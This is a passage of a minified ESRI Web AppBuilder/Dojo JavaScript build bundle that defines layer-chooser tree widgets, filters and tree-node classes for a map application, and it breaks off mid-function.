// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"jimu/dijit/LayerChooserFromMapLite":function(){define("dojo/on dojo/_base/declare dojo/promise/all dojo/_base/lang dojo/_base/html dojo/_base/array jimu/dijit/CheckBox jimu/dijit/LayerChooserFromMap jimu/LayerStructure".split(" "),function(h,p,n,m,c,b,e,f,a){var l=p([f],{templateString:'\x3cdiv style\x3d"width:100%;"\x3e\x3cdiv data-dojo-attach-point\x3d"errorTipSection" class\x3d"error-tip-section"\x3e\x3cspan class\x3d"jimu-icon jimu-icon-error"\x3e\x3c/span\x3e\x3cspan class\x3d"jimu-state-error-text" data-dojo-attach-point\x3d"errTip"\x3e${nls.noLayersTip}\x3c/span\x3e\x3c/div\x3e\x3cdiv data-dojo-attach-point\x3d"treeSection" class\x3d"tree-section"\x3e\x3cul data-dojo-attach-point\x3d"treeUl" class\x3d"tree-ul tree-root-ul"\x3e\x3c/ul\x3e\x3c/div\x3e\x3c/div\x3e',
map:null,layerStateController:null,layerState:null,customFilter:null,onlySelectLeafLayer:!1,displayLayerTypeIcon:!0,showTables:!0,layerStructure:null,_layerDatas:null,_eventHandles:null,postMixInProperties:function(){this.nls=window.jimuNls.basicLayerChooserFromMap},postCreate:function(){c.addClass(this.domNode,"jimu-basic-layer-chooser-from-map");c.addClass(this.domNode,"jimu-basic-layer-chooser-from-map-lite");this._layerDatas={};this._eventHandles=[];this.layerStructure=this.map?a.createInstance(this.map):
a.getInstance();this.layerInfosObj=this.layerStructure._layerInfos;this.layerState=this._clearLayerState(this.layerState)||{};this.layerStateController||(this.layerStateController=new l.LayerStateController);var k;k=this.customFilter?m.hitch(this,this.customFilter):m.hitch(this,this.filter);this.filter=f.andCombineFilters([this.basicFilter,k]);this._createTree()},_createTree:function(){var k=this.layerStructure.getLayerNodes(),d=this.layerStructure.getTableNodes();0<this._createLayerNodes(k.concat(this.showTables?
d:[]),this.treeUl)&&(c.setStyle(this.errorTipSection,"display","none"),this.layerStateController.restoreState(this.layerState,this.layerStructure))},_createLayerNodes:function(k,d){var a=b.map(k,function(d){return this.filter(d._layerInfo)},this),c=0;n(a).then(m.hitch(this,function(a){b.forEach(a,function(a,b){a&&(this._createLayerNode(k[b],d),c++)},this)}));return c},_createLayerNode:function(k,d){var a=c.create("li",{"class":"tree-node-li",id:"layerchooserlite-tree-node-li-"+k.id},d),b=c.create("div",
{"class":"tree-node-div"},a);d=c.create("span",{"class":"tree-node-column-span collapse-span"},b);var f=c.create("span",{"class":"tree-node-column-span check-box-span"},b),l=c.create("div",{"class":"tree-node-column-div check-box-div"},f),f=c.create("span",{"class":"tree-node-column-span icon-span "+(this.displayLayerTypeIcon?"display":"")},b),g;g=(g=this.layerState[k.id])?g.selected:this.layerStateController.getState(k);l=new e({checked:g},l);g=c.create("span",{"class":"tree-node-column-span title-span",
innerHTML:k.title},b);var A=c.create("ul",{"class":"tree-ul tree-subnode-ul",style:"display:none; "},a),a={layerNode:k,layerNodeLi:a,layerNodeDiv:b,collapseSpan:d,iconSpan:f,checkBox:l,subLayerNodeUl:A,hasBeenOpened:!1};this._layerDatas[k.id]=a;k.isLeaf()||(c.addClass(d,"is-leaf"),c.addClass(g,"is-leaf"),k=h(d,"click",m.hitch(this,this._onCollapse,a)),this._eventHandles.push(k),k=h(g,"click",m.hitch(this,this._onCollapse,a)),this._eventHandles.push(k),this.onlySelectLeafLayer&&l.setStatus(!1));k=
h(l.domNode,"click",m.hitch(this,this._onCheckBoxChange,a));this._eventHandles.push(k);this._setIconImage(a,!1);return a},_setIconImage:function(a,d){if(this.displayLayerTypeIcon){var k=a.layerNode,b=k.getLayerType(),e=k.getLayerObject();n({layerType:b,layerObject:e}).then(m.hitch(this,function(b){var g;b.layerType&&b.layerObject&&(g={type:b.layerType,layerInfo:k._layerInfo},b=window.location.protocol+"//"+window.location.host+require.toUrl("jimu"),(g=this._getIconImageName(g,d))&&c.setStyle(a.iconSpan,
"background-image","url("+b+"/css/images/"+g+")"))}))}},_getCheckBoxValue:function(a){return a.getStatus()?a.getValue():!1},_clearLayerState:function(a){var d={};a&&this.layerStructure.traversal(m.hitch(this,function(k){a[k.id]&&(d[k.id]={selected:a[k.id].selected})}));return d},_selectOrDeselectLayer:function(a,d){if(a=this._layerDatas[a])a.checkBox.setValue(d),this._onCheckBoxChange(a)},selectLayer:function(a){this._selectOrDeselectLayer(a,!0)},deselectLayer:function(a){this._selectOrDeselectLayer(a,
!1)},getState:function(){var a=m.clone(this.layerState),d;for(d in this._layerDatas)this._layerDatas.hasOwnProperty(d)&&"function"!==typeof this._layerDatas[d]&&(this._getCheckBoxValue(this._layerDatas[d].checkBox)?a[d]={selected:!0}:a[d]={selected:!1});return a},restoreState:function(a){this.layerState=a;for(var d in a)if(a.hasOwnProperty(d)&&"function"!==typeof a[d]){var k=this._layerDatas[d],k=k&&k.checkBox,b=a[d];k&&k.setValue(b.selected)}this.layerStateController.restoreState(a,this.layerStructure)},
getSelectedLayerNodes:function(){var a=[],d=this.getState(),b;for(b in d)if(d.hasOwnProperty(b)&&"function"!==typeof d[b]&&d[b].selected){var c=this.layerStructure.getNodeById(b);c&&a.push(c)}return a},getLoadedLayerNodes:function(){var a=[],d;for(d in this._layerDatas)if(this._layerDatas.hasOwnProperty(d)&&"function"!==typeof this._layerDatas[d]){var b=this.layerStructure.getNodeById(d);b&&a.push(b)}return a},getLayerAssociateDomNodesById:function(a){var d=null;(a=this._layerDatas[a])&&(d={collapseIcon:a.collapseSpan,
checkBox:a.checkBox.domNode,layerTypeIcon:a.iconSpan});return d},getSelectedItems:function(){var a=[];return a=b.map(this.getSelectedLayerNodes(),function(a){return{name:a.title,url:a.getUrl(),layerInfo:a._layerInfo}},this)},getAllItems:function(){return[]},_clear:function(){this._layerDatas={};b.forEach(this._eventHandles,function(a){a.remove()},this);this._eventHandles=[];c.empty(this.treeUl)},destroy:function(){this._clear();this.map&&this.layerStructure.destroy();this.shelter&&(this.shelter.destroy(),
this.shelter=null);this.inherited(arguments)},_onCollapse:function(a){var d="none"===c.getStyle(a.subLayerNodeUl,"display")?!0:!1;d?(c.setStyle(a.subLayerNodeUl,"display","block"),c.addClass(a.collapseSpan,"opened")):(c.setStyle(a.subLayerNodeUl,"display","none"),c.removeClass(a.collapseSpan,"opened"));this._setIconImage(a,d);a.hasBeenOpened||(this._createLayerNodes(a.layerNode.getSubNodes(),a.subLayerNodeUl),a.hasBeenOpened=!0)},_onCheckBoxChange:function(a,d){this.layerStateController.setState(a.layerNode,
this._getCheckBoxValue(a.checkBox));this.emit("selection-change",a.layerNode,this._getCheckBoxValue(a.checkBox));this._onTreeClick(a,d)},_onLayerInfosChanged:function(){this._createTree();this.emit("update")},_onLayerInfosIsShowInMapChanged:function(){this._createTree();this.emit("update")},_onTreeClick:function(a,d){a={name:a.layerNode.title||"",parent:null,layerInfo:a.layerNode._layerInfo,type:null,layerClass:null,id:null,isLeaf:a.layerNode.isLeaf(),hasChildren:a.layerNode.isLeaf()?!1:!0};this.emit("tree-click",
a,null,d)}});l.LayerStateController=p(null,{getState:function(a){return!0},setState:function(a,d){return this},restoreState:function(a,d){return this}});l.LayerVisibilityStateController=p(l.LayerStateController,{getState:function(a){return a.isToggledOn()},setState:function(a,d){a.toggle();return this},restoreState:function(a,d){var b={layerOptions:{}},c;for(c in a)a.hasOwnProperty(c)&&"function"!==typeof a[c]&&(b.layerOptions[c]={visible:a[c].selected});d.restoreState(b);return this}});l.layerVisibilityStateController=
new l.LayerVisibilityStateController;l.LayerLegendStateController=p(l.LayerStateController,{getState:function(a){return a.isToggledOnLegendFromWebMap()}});l.layerLegendStateController=new l.LayerLegendStateController;return l})},"jimu/dijit/LayerChooserFromMap":function(){define("dojo/on dojo/Evented dojo/_base/declare dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/store/Memory dojo/Deferred dojo/store/Observable dijit/tree/ObjectStoreModel dojo/promise/all dojo/_base/lang dojo/_base/html dojo/_base/array jimu/utils jimu/dijit/_Tree jimu/LayerInfos/LayerInfos jimu/dijit/LoadingIndicator".split(" "),
function(h,p,n,m,c,b,e,f,a,l,k,d,u,r,y,q,g,A){var t=n([m,c,b,p],{templateString:'\x3cdiv style\x3d"width:100%;"\x3e\x3cdiv data-dojo-attach-point\x3d"errorTipSection" class\x3d"error-tip-section"\x3e\x3cspan class\x3d"jimu-icon jimu-icon-error"\x3e\x3c/span\x3e\x3cspan class\x3d"jimu-state-error-text" data-dojo-attach-point\x3d"errTip"\x3e${nls.noLayersTip}\x3c/span\x3e\x3c/div\x3e\x3c/div\x3e',_store:null,_id:0,_treeClass:"layer-chooser-tree",createMapResponse:null,multiple:!1,onlyShowVisible:!1,
updateWhenLayerInfosIsShowInMapChanged:!1,onlyShowWebMapLayers:!1,displayTooltipForTreeNode:!1,postMixInProperties:function(){this.nls=window.jimuNls.basicLayerChooserFromMap},postCreate:function(){this.inherited(arguments);u.addClass(this.domNode,"jimu-basic-layer-chooser-from-map");this.multiple=!!this.multiple;this.shelter=new A({hidden:!0});this.shelter.placeAt(this.domNode);this.shelter.startup();this._createTree();this.basicFilter=d.hitch(this,this.basicFilter);this.filter=t.andCombineFilters([this.basicFilter,
this.filter]);this.createMapResponse&&this.setCreateMapResponse(this.createMapResponse)},basicFilter:function(a){var d=new f;this.onlyShowVisible?d.resolve(a.isShowInMap()):d.resolve(!0);return d},filter:function(a){a=new f;a.resolve(!0);return a},getSelectedItems:function(){var a=this.tree.getSelectedItems();return r.map(a,d.hitch(this,function(a){return this.getHandledItem(a)}))},getAllItems:function(){var a=this.tree.getAllItems(),b=[];r.forEach(a,d.hitch(this,function(a){"root"!==a.id&&(a=this.getHandledItem(a),
b.push(a))}));return b},getHandledItem:function(a){return{name:a.name,layerInfo:a.layerInfo}},_isLeafItem:function(a){return a.isLeaf},setCreateMapResponse:function(a){this.createMapResponse=a;g.getInstance(this.createMapResponse.map,this.createMapResponse.itemInfo).then(d.hitch(this,function(a){this.layerInfosObj=a;this.own(h(this.layerInfosObj,"layerInfosChanged",d.hitch(this,this._onLayerInfosChanged)));this.updateWhenLayerInfosIsShowInMapChanged&&this.own(h(this.layerInfosObj,"layerInfosIsShowInMapChanged",
d.hitch(this,this._onLayerInfosIsShowInMapChanged)));this._buildTree(this.layerInfosObj)}))},_onLayerInfosChanged:function(a,d){this._buildTree(this.layerInfosObj);this.emit("update")},_onLayerInfosIsShowInMapChanged:function(a){this._buildTree(this.layerInfosObj);this.emit("update")},_buildTree:function(a){this._clear();u.setStyle(this.errorTipSection,"display","block");var b=[];this.onlyShowWebMapLayers?(b=a.getLayerInfoArrayOfWebmap(),b=b.concat(a.getTableInfoArrayOfWebmap())):(b=a.getLayerInfoArray(),
b=b.concat(a.getTableInfoArray()));0!==b.length&&(u.setStyle(this.errorTipSection,"display","none"),r.forEach(b,d.hitch(this,function(a){this._addDirectLayerInfo(a)})))},_addDirectLayerInfo:function(a){a&&a.getLayerObject().then(d.hitch(this,function(){this._addItem("root",a)}),d.hitch(this,function(a){console.error(a)}))},_clear:function(){var a=this._store.query({parent:"root"});r.forEach(a,d.hitch(this,function(a){a&&"root"!==a.id&&this._store.remove(a.id)}))},_addItem:function(a,b){var c=null,
g=b.getLayerType(),e=this.filter(b);k({layerType:g,valid:e}).then(d.hitch(this,function(g){if(g.valid){var e=d.hitch(this,function(d,e){this._id++;c={name:b.title||"",parent:a,layerInfo:b,type:g.layerType,layerClass:b.layerObject.declaredClass,id:this._id.toString(),isLeaf:d,hasChildren:e};this._store.add(c)}),f=b.getSubLayers(),l=0===f.length;l?e(l,!1):(f=r.map(f,d.hitch(this,function(a){return this.filter(a)})),k(f).then(d.hitch(this,function(a){(a=r.some(a,function(a){return a}))&&e(l,a)})))}}))},
_getRootItem:function(){return{id:"root",name:"Map Root",type:"root",isLeaf:!1,hasChildren:!0}},_createTree:function(){var b=this._getRootItem(),b=new e({data:[b],getChildren:function(a){return this.query({parent:a.id})}});this._store=new a(b);b=new l({store:this._store,query:{id:"root"},mayHaveChildren:d.hitch(this,this._mayHaveChildren)});this.tree=new q({multiple:this.multiple,model:b,showRoot:!1,isLeafItem:d.hitch(this,this._isLeafItem),style:{width:"100%"},onOpen:d.hitch(this,function(a,d){"root"!==
a.id&&this._onTreeOpen(a,d)}),onClick:d.hitch(this,function(a,d,b){this._onTreeClick(a,d,b);this.emit("tree-click",a,d,b)}),getIconStyle:d.hitch(this,function(a,d){var b=null;if(!a||"root"===a.id)return null;var c={width:"20px",height:"20px",backgroundRepeat:"no-repeat",backgroundPosition:"center center",backgroundImage:""},g=window.location.protocol+"//"+window.location.host+require.toUrl("jimu");if(a=this._getIconImageName(a,d))c.backgroundImage="url("+g+"/css/images/"+a+")",b=c;return b}),getTooltip:d.hitch(this,
function(a){return this.displayTooltipForTreeNode?a.layerInfo.title:""})});u.addClass(this.tree.domNode,this._treeClass);this.tree.placeAt(this.shelter.domNode,"before")},_mayHaveChildren:function(a){return a.hasChildren},_getIconImageName:function(a,d){var b="";"ArcGISDynamicMapServiceLayer"===a.type||"ArcGISTiledMapServiceLayer"===a.type?b=d?"mapserver_open.png":"mapserver_close.png":"GroupLayer"===a.type?b=d?"group_layer2.png":"group_layer1.png":"FeatureLayer"===a.type?(a=y.getTypeByGeometryType(a.layerInfo.layerObject.geometryType),
"point"===a?b="point_layer1.png":"polyline"===a?b="line_layer1.png":"polygon"===a&&(b="polygon_layer1.png")):b="Table"===a.type?"table.png":"ArcGISImageServiceLayer"===a.type||"ArcGISImageServiceVectorLayer"===a.type?"image_layer.png":d?"mapserver_open.png":"mapserver_close.png";return b},_onTreeOpen:function(a,b){if("root"!==a.id){var c=[];b=[];c=a.layerInfo.getSubLayers();a.checked||(this.shelter.show(),b=r.map(c,d.hitch(this,function(a){return a.getLayerObject()})),k(b).then(d.hitch(this,function(){this.domNode&&
(r.forEach(c,d.hitch(this,function(b){this._addItem(a.id,b)})),a.checked=!0,this.shelter.hide())}),d.hitch(this,function(a){console.error(a);this.shelter.hide()})))}},_onTreeClick:function(a,b,d){},destroy:function(){this.shelter&&(this.shelter.destroy(),this.shelter=null);this.tree&&this.tree.destroy();this.inherited(arguments)}});t.createFilterByLayerType=function(a){d.isArrayLike(a)||(a=[]);return function(b){var d=new f;if(0===a.length)d.resolve(!0);else{var c=[];b.traversal(function(a){c.push(a.getLayerType())});
k(c).then(function(b){for(var c=0;c<b.length;c++)for(var g=0;g<a.length;g++)if(b[c]===a[g]){d.resolve(!0);return}d.resolve(!1)},function(a){console.error(a);d.reject(a)})}return d}};t.createFeaturelayerFilter=function(a,b,d,c){var g=["point","polyline","polygon"];a&&0<a.length?(a=r.filter(a,function(a){return 0<=g.indexOf(a)}),0===a.length&&(a=g)):a=g;return function(g){var e=g.getLayerType();g=g.getLayerObject();return k({layerType:e,layerObject:g}).then(function(g){var e=g.layerType;g=g.layerObject;
if("ArcGISDynamicMapServiceLayer"===e||"ArcGISTiledMapServiceLayer"===e||"GroupLayer"===e||"FeatureCollection"===e)return!0;if("FeatureLayer"===e){var e=y.getTypeByGeometryType(g.geometryType),e=0<=r.indexOf(a,e),f=t._shouldPassStatisticsCheck(c,g);return g.url?(g=y.isFeaturelayerUrlSupportQuery(g.url,g.capabilities),e&&g&&f):b&&e}return"Table"===e?(e=y.isFeaturelayerUrlSupportQuery(g.url,g.capabilities),g=t._shouldPassStatisticsCheck(c,g),d&&e&&g):!1})}};t.createImageServiceLayerFilter=function(a,
b){return function(d){var g=d.getLayerType();d=d.getLayerObject();return k({layerType:g,layerObject:d}).then(function(d){var g=d.layerType,c=d.layerObject;return"ArcGISImageServiceLayer"===g||"ArcGISImageServiceVectorLayer"===g?a?y.isImageServiceSupportQuery(d.layerObject.capabilities)?b?t._shouldPassStatisticsCheck(b,c):!0:!1:!0:!1})}};t._shouldPassStatisticsCheck=function(a,d){return a?(a=!1,a=d.advancedQueryCapabilities?!!d.advancedQueryCapabilities.supportsStatistics:!!d.supportsStatistics):!0};
t.createQueryableLayerFilter=function(a){var d=t.createFeaturelayerFilter(["point","polyline","polygon"],!1,!0,a);a=t.createImageServiceLayerFilter(!0,a);return t.orCombineFilters([d,a])};t.andCombineFilters=function(a){return t._combineFilters(a,!0)};t.orCombineFilters=function(a){return t._combineFilters(a,!1)};t._combineFilters=function(a,d){return function(b){var g=new f,c=r.map(a,function(a){return a(b)});k(c).then(function(a){var b=!1,b=d?r.every(a,function(a){return a}):r.some(a,function(a){return a});
g.resolve(b)},function(a){console.error(a);g.reject(a)});return g}};return t})},"dijit/tree/ObjectStoreModel":function(){define("dojo/_base/array dojo/aspect dojo/_base/declare dojo/Deferred dojo/_base/lang dojo/when ../Destroyable".split(" "),function(h,p,n,m,c,b,e){return n("dijit.tree.ObjectStoreModel",e,{store:null,labelAttr:"name",labelType:"text",root:null,query:null,constructor:function(b){c.mixin(this,b);this.childrenCache={}},getRoot:function(e,a){if(this.root)e(this.root);else{var f=this.store.query(this.query);
f.then&&this.own(f);b(f,c.hitch(this,function(a){if(1!=a.length)throw Error("dijit.tree.ObjectStoreModel: root query returned "+a.length+" items, but must return exactly one");this.root=a[0];e(this.root);f.observe&&f.observe(c.hitch(this,function(a){this.onChange(a)}),!0)}),a)}},mayHaveChildren:function(){return!0},getChildren:function(e,a,l){var f=this.store.getIdentity(e);if(this.childrenCache[f])b(this.childrenCache[f],a,l);else{var d=this.childrenCache[f]=this.store.getChildren(e);d.then&&this.own(d);
d.observe&&this.own(d.observe(c.hitch(this,function(a,f,l){this.onChange(a);f!=l&&b(d,c.hitch(this,"onChildrenChange",e))}),!0));b(d,a,l)}},isItem:function(){return!0},getIdentity:function(b){return this.store.getIdentity(b)},getLabel:function(b){return b[this.labelAttr]},newItem:function(b,a,c,e){return this.store.put(b,{parent:a,before:e})},pasteItem:function(b,a,e,k,d,u){var f=new m;if(a===e&&!k&&!u)return f.resolve(!0),f;a&&!k?this.getChildren(a,c.hitch(this,function(d){d=[].concat(d);var c=h.indexOf(d,
b);d.splice(c,1);this.onChildrenChange(a,d);f.resolve(this.store.put(b,{overwrite:!0,parent:e,oldParent:a,before:u}))})):f.resolve(this.store.put(b,{overwrite:!0,parent:e,oldParent:a,before:u}));return f},onChange:function(){},onChildrenChange:function(){},onDelete:function(){}})})},"jimu/dijit/_Tree":function(){define("dojo/_base/declare dijit/_WidgetBase dijit/_TemplatedMixin dojo/text!./templates/_TreeNode.html dojo/_base/lang dojo/_base/html dojo/_base/array dojo/_base/event dojo/query dojo/aspect dojo/on dojo/Evented dijit/registry dijit/Tree jimu/utils".split(" "),
function(h,p,n,m,c,b,e,f,a,l,k,d,u,r,y){var q=h([r._TreeNode,d],{templateString:m,declaredClass:"jimu._TreeNode",isLeaf:!1,groupId:"",postCreate:function(){this.inherited(arguments);b.addClass(this.domNode,"jimu-tree-node");this.isLeaf=!!this.isLeaf;this.groupId?(this.checkNode=b.toDom('\x3cinput type\x3d"radio" /\x3e'),this.checkNode.name=this.groupId):this.checkNode=b.toDom('\x3cinput type\x3d"checkbox" /\x3e');b.addClass(this.checkNode,"jimu-tree-check-node");b.place(this.checkNode,this.contentNode,
"first");this.own(k(this.checkNode,"click",c.hitch(this,this._onClick)));this.isLeaf?this.groupId?b.setStyle(this.checkNode,"display","none"):b.setStyle(this.checkNode,"display","inline"):b.setStyle(this.checkNode,"display","none");this.isLeaf?b.addClass(this.domNode,"jimu-tree-leaf-node"):b.addClass(this.domNode,"jimu-tree-not-leaf-node")},select:function(){this.isLeaf&&(this.checkNode.checked=!0,b.addClass(this.domNode,"jimu-tree-selected-leaf-node"))},unselect:function(){this.isLeaf&&(this.checkNode.checked=
!1,b.removeClass(this.domNode,"jimu-tree-selected-leaf-node"))},toggleSelect:function(){this.isLeaf&&(this.checkNode.checked?this.unselect():this.select())},_onClick:function(a){(a.target||a.srcElement)===this.checkNode?this.tree._onCheckNodeClick(this,this.checkNode.checked,a):this.tree._onClick(this,a)},_onChange:function(){this.isLeaf&&setTimeout(c.hitch(this,function(){this.checkNode.checked?this.emit("tn-select",this):this.emit("tn-unselect",this)}),100)},destroy:function(){delete this.tree;
this.inherited(arguments)}});return h([r,d],{declaredClass:"jimu._Tree",openOnClick:!0,multiple:!0,uniqueId:"",showRoot:!1,postMixInProperties:function(){this.inherited(arguments);this.uniqueId="tree_"+y.getRandomString()},postCreate:function(){this.inherited(arguments);b.addClass(this.domNode,"jimu-tree");this.own(l.before(this,"onClick",c.hitch(this,this._jimuBeforeClick)));this.rootLoadingIndicator&&b.setStyle(this.rootLoadingIndicator,"display","none");this.dndController.singular=!0},removeItem:function(a){this.model.store.remove(a)},
getAllItems:function(){var a=this.getAllTreeNodeWidgets();return e.map(a,c.hitch(this,function(a){var b=a.item;b.selected=a.checkNode.checked;return b}))},getSelectedItems:function(){var a=this.getAllTreeNodeWidgets(),a=e.filter(a,c.hitch(this,function(a){return a.checkNode.checked}));return e.map(a,c.hitch(this,function(a){return a.item}))},getFilteredItems:function(a){var b=this.getAllTreeNodeWidgets(),b=e.map(b,c.hitch(this,function(a){var b=a.item;b.selected=a.checkNode.checked;return b}));return e.filter(b,
c.hitch(this,function(b){return a(b)}))},getTreeNodeByItemId:function(a){for(var b=this._getAllTreeNodeDoms(),d=0;d<b.length;d++){var c=u.byNode(b[d]);if(c.item.id.toString()===a.toString())return c}return null},selectItem:function(a){(a=this.getTreeNodeByItemId(a))&&a.isLeaf&&this.selectNodeWidget(a)},unselectItem:function(a){(a=this.getTreeNodeByItemId(a))&&a.isLeaf&&a.unselect()},getAllLeafTreeNodeWidgets:function(){var a=this.getAllTreeNodeWidgets();return e.filter(a,c.hitch(this,function(a){return a.isLeaf}))},
getAllTreeNodeWidgets:function(){var a=this._getAllTreeNodeDoms();return e.map(a,c.hitch(this,function(a){return u.byNode(a)}))},isLeafItem:function(a){return a&&a.isLeaf},_getAllTreeNodeDoms:function(){return a(".dijitTreeNode",this.domNode)},_createTreeNode:function(a){a.isLeaf=this.isLeafItem(a.item);this.multiple||(a.groupId=this.uniqueId);return new q(a)},_onTreeNodeSelect:function(a){this.emit("item-select",{item:a.item,treeNode:a})},_onTreeNodeUnselect:function(a){this.emit("item-unselect",
{item:a.item,treeNode:a})},selectNodeWidget:function(a){this.multiple||this.unselectAllLeafNodeWidgets();a.select()},_jimuBeforeClick:function(a,d,c){d.isLeaf&&(b.hasClass(c.target||c.srcElement,"jimu-tree-check-node")||(this.multiple?d.toggleSelect():this.selectNodeWidget(d)));return arguments},_onCheckNodeClick:function(a,b,d){!this.multiple&&b&&this.unselectAllLeafNodeWidgets();f.stop(d);this.focusNode(a);setTimeout(c.hitch(this,function(){b?this.selectNodeWidget(a):a.unselect();this.onClick(a.item,
a,d)}),0)},unselectAllLeafNodeWidgets:function(){var a=this.getAllLeafTreeNodeWidgets();e.forEach(a,c.hitch(this,function(a){a.unselect()}))}})})},"dijit/Tree":function(){define("dojo/_base/array dojo/aspect dojo/cookie dojo/_base/declare dojo/Deferred dojo/promise/all dojo/dom dojo/dom-class dojo/dom-geometry dojo/dom-style dojo/errors/create dojo/fx dojo/has dojo/_base/kernel dojo/keys dojo/_base/lang dojo/on dojo/topic dojo/touch dojo/when ./a11yclick ./focus ./registry ./_base/manager ./_Widget ./_TemplatedMixin ./_Container ./_Contained ./_CssStateMixin ./_KeyNavMixin dojo/text!./templates/TreeNode.html dojo/text!./templates/Tree.html ./tree/TreeStoreModel ./tree/ForestStoreModel ./tree/_dndSelector dojo/query!css2".split(" "),
function(h,p,n,m,c,b,e,f,a,l,k,d,u,r,y,q,g,A,t,J,D,K,B,E,F,H,I,M,G,L,N,O,R,P,Q){function x(a){return q.delegate(a.promise||a,{addCallback:function(a){this.then(a)},addErrback:function(a){this.otherwise(a)}})}var C=m("dijit._TreeNode",[F,H,I,M,G],{item:null,isTreeNode:!0,label:"",_setLabelAttr:function(a){this.labelNode["html"==this.labelType?"innerHTML":"innerText"in this.labelNode?"innerText":"textContent"]=a;this._set("label",a);u("dojo-bidi")&&this.applyTextDir(this.labelNode)},labelType:"text",
isExpandable:null,isExpanded:!1,state:"NotLoaded",templateString:N,baseClass:"dijitTreeNode",cssStateNodes:{rowNode:"dijitTreeRow"},_setTooltipAttr:{node:"rowNode",type:"attribute",attribute:"title"},buildRendering:function(){this.inherited(arguments);this._setExpando();this._updateItemClasses(this.item);this.isExpandable&&this.labelNode.setAttribute("aria-expanded",this.isExpanded);this.setSelected(!1)},_setIndentAttr:function(a){var b=Math.max(a,0)*this.tree._nodePixelIndent+"px";l.set(this.domNode,
"backgroundPosition",b+" 0px");l.set(this.rowNode,this.isLeftToRight()?"paddingLeft":"paddingRight",b);h.forEach(this.getChildren(),function(b){b.set("indent",a+1)});this._set("indent",a)},markProcessing:function(){this.state="Loading";this._setExpando(!0)},unmarkProcessing:function(){this._setExpando(!1)},_updateItemClasses:function(a){var b=this.tree,d=b.model;b._v10Compat&&a===d.root&&(a=null);this._applyClassAndStyle(a,"icon","Icon");this._applyClassAndStyle(a,"label","Label");this._applyClassAndStyle(a,
"row","Row");this.tree._startPaint(!0)},_applyClassAndStyle:function(a,b,d){var w="_"+b+"Class";b+="Node";var v=this[w];this[w]=this.tree["get"+d+"Class"](a,this.isExpanded);f.replace(this[b],this[w]||"",v||"");l.set(this[b],this.tree["get"+d+"Style"](a,this.isExpanded)||{})},_updateLayout:function(){var a=this.getParent(),a=!a||!a.rowNode||"none"==a.rowNode.style.display;f.toggle(this.domNode,"dijitTreeIsRoot",a);f.toggle(this.domNode,"dijitTreeIsLast",!a&&!this.getNextSibling())},_setExpando:function(a){var b=
["dijitTreeExpandoLoading","dijitTreeExpandoOpened","dijitTreeExpandoClosed","dijitTreeExpandoLeaf"];a=a?0:this.isExpandable?this.isExpanded?1:2:3;f.replace(this.expandoNode,b[a],b);this.expandoNodeText.innerHTML=["*","-","+","*"][a]},expand:function(){if(this._expandDeferred)return x(this._expandDeferred);this._collapseDeferred&&(this._collapseDeferred.cancel(),delete this._collapseDeferred);this.isExpanded=!0;this.labelNode.setAttribute("aria-expanded","true");(this.tree.showRoot||this!==this.tree.rootNode)&&
this.containerNode.setAttribute("role","group");f.add(this.contentNode,"dijitTreeContentExpanded");this._setExpando();this._updateItemClasses(this.item);this==this.tree.rootNode&&this.tree.showRoot&&this.tree.domNode.setAttribute("aria-expanded","true");var a=d.wipeIn({node:this.containerNode,duration:E.defaultDuration}),b=this._expandDeferred=new c(function(){a.stop()});p.after(a,"onEnd",function(){b.resolve(!0)},!0);a.play();return x(b)},collapse:function(){if(this._collapseDeferred)return x(this._collapseDeferred);
this._expandDeferred&&(this._expandDeferred.cancel(),delete this._expandDeferred);this.isExpanded=!1;this.labelNode.setAttribute("aria-expanded","false");this==this.tree.rootNode&&this.tree.showRoot&&this.tree.domNode.setAttribute("aria-expanded","false");f.remove(this.contentNode,"dijitTreeContentExpanded");this._setExpando();this._updateItemClasses(this.item);var a=d.wipeOut({node:this.containerNode,duration:E.defaultDuration}),b=this._collapseDeferred=new c(function(){a.stop()});p.after(a,"onEnd",
function(){b.resolve(!0)},!0);a.play();return x(b)},indent:0,setChildItems:function(a){var d=this.tree,w=d.model,c=[],g=d.focusedChild,f=this.getChildren();h.forEach(f,function(a){I.prototype.removeChild.call(this,a)},this);this.defer(function(){h.forEach(f,function(a){if(!a._destroyed&&!a.getParent()){var b=function(a){var c=w.getIdentity(a.item),e=d._itemNodesMap[c];1==e.length?delete d._itemNodesMap[c]:(c=h.indexOf(e,a),-1!=c&&e.splice(c,1));h.forEach(a.getChildren(),b)};d.dndController.removeTreeNode(a);
b(a);if(d.persist){var c=h.map(a.getTreePath(),function(a){return d.model.getIdentity(a)}).join("/"),v;for(v in d._openedNodes)v.substr(0,c.length)==c&&delete d._openedNodes[v];d._saveExpandedNodes()}d.lastFocusedChild&&!e.isDescendant(d.lastFocusedChild.domNode,d.domNode)&&delete d.lastFocusedChild;g&&!e.isDescendant(g.domNode,d.domNode)&&d.focus();a.destroyRecursive()}})});this.state="Loaded";a&&0<a.length?(this.isExpandable=!0,h.forEach(a,function(a){var b=w.getIdentity(a),e=d._itemNodesMap[b],
v;if(e)for(var g=0;g<e.length;g++)if(e[g]&&!e[g].getParent()){v=e[g];v.set("indent",this.indent+1);break}v||(v=this.tree._createTreeNode({item:a,tree:d,isExpandable:w.mayHaveChildren(a),label:d.getLabel(a),labelType:d.model&&d.model.labelType||"text",tooltip:d.getTooltip(a),ownerDocument:d.ownerDocument,dir:d.dir,lang:d.lang,textDir:d.textDir,indent:this.indent+1}),e?e.push(v):d._itemNodesMap[b]=[v]);this.addChild(v);(this.tree.autoExpand||this.tree._state(v))&&c.push(d._expandNode(v))},this),h.forEach(this.getChildren(),
function(a){a._updateLayout()})):this.isExpandable=!1;this._setExpando&&this._setExpando(!1);this._updateItemClasses(this.item);a=b(c);this.tree._startPaint(a);return x(a)},getTreePath:function(){for(var a=this,b=[];a&&a!==this.tree.rootNode;)b.unshift(a.item),a=a.getParent();b.unshift(this.tree.rootNode.item);return b},getIdentity:function(){return this.tree.model.getIdentity(this.item)},removeChild:function(a){this.inherited(arguments);var b=this.getChildren();0==b.length&&(this.isExpandable=!1,
